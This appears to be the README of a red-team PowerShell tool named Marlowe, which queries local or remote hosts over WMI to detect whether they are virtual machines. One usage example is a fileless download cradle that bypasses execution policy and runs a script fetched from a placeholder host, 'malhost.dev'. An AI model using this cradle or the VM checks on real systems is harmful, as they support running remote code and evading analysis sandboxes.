# Marlowe
**Marlowe** is a PowerShell script which uses WMI to query local and remote systems with the aim of revealing whether said systems are virtual machines. 

# Usage
### Local system
```
PS C:\Users\tester> . .\Marlowe.ps1; Invoke-Marlowe
VM detected! (6/8)
```
```
C:\> powershell.exe -ep bypass -nop -c "iex(New-Object Net.WebClient).downloadString('hxxp://malhost.dev/marlowe.ps1'); Invoke-Marlowe"
VM detected! (4/8)
```

### Remote system
```
PS C:\Users\tester> . .\Marlowe.ps1; Invoke-Marlowe -Machine "fs-m01"
VM detected! (4/8)
```

### Alternative Usage
One can also utilize individual functions that **Marlowe** uses in order to evaluate whether target system is a VM or not. If the chosen function returns `True` or a non-zero value, target system is (likely) a VM.
```
PS C:\Users\tester> . .\Marlowe.ps1 ; Check-VMProcesses
True
```

# False Positives
- 05/23/21 - `Check-PortConnector` returns false positives on ESXi (tested on v7.1)